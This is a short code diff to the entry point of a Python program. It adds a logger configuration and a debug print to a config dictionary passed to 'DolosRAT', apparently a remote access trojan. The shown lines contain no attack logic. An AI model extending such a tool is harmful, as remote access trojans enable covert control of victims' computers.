@@ -115,8 +115,10 @@ if __name__ == '__main__':
 
     # Populate 'dolos_config' with configurations.
     dolos_config = {
-        
+       'logger_conf': get_logger_conf(__name__)
     }
+
+    print(dolos_config)
 
     # Application entry-point.
     DolosRAT(dolos_config)
